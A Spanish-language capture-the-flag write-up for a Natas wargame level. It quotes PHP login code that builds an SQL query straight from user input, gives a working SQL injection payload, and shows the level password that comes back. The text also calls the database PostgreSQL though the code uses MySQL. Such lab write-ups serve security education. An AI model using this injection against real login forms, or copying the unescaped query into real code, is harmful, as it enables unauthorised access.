Si inspeccionamos el HTML, que ahora que hay ingresar un usuario y una
contraseña. Obtenemos el código y notamos que el usuario y la contraseña se
validan en una base de datos PostgreSQL.

```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
```

Debemos armar un usuario y contraseña tal que siempre de cierto, sin importar
las tuplas de la tabla:

```MySQL
SELECT * from users where username="user" and password="pass" OR 1 OR ""
```

Debido a que `1` se evalua como verdadero, la consulta devolverá todos los
usuarios. Luego, podemos armar el request:`username=user&password=pass" OR 1 OR "`

Al enviar el formulario, obtendremos la contraseña para el siguiente nivel:

```text
Successful login! The password for natas15 is
TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
```
